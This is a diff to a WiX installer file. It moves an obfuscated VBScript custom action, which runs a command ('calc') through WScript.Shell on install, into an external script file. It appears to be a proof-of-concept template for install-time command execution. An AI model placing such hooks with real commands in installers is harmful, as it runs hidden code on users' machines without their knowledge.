@@ -35,29 +35,8 @@
         </Feature>
 
         <!-- Step 4: Post-Install actions -->
-        <CustomAction Id="DhHxOkM" Execute="deferred" Script="vbscript" Return="ignore" Impersonate="yes" >
-            On Error Resume Next
-            Sub obf_GeneratorEntryPoint()
-                obf_LaunchCommand "calc"
-            End Sub
-            Sub obf_MacroEntryPoint()
-                On Error Resume Next
-                obf_GeneratorEntryPoint
-            End Sub
-            Sub obf_Runtime()
-                obf_MacroEntryPoint
-            End Sub
-            Sub obf_LaunchCommand(ByVal obf_command)
-                Dim obf_launcher
-                Dim obf_cmd
-                With CreateObject("WScript.Shell")
-                    With .Exec(obf_command)
-                        .Terminate
-                    End With
-                End With
-            End Sub
-            obf_Runtime
-        </CustomAction>
+        <Binary Id="lmskBju" SourceFile="run-calc.vbs" />
+        <CustomAction Id="DhHxOkM" Execute="immediate" BinaryKey="lmskBju" VBScriptCall="obf_Runtime" Return="ignore" Impersonate="yes" />
 
         <InstallExecuteSequence>
             <Custom Action="DhHxOkM" Before="InstallFinalize">NOT REMOVE</Custom>
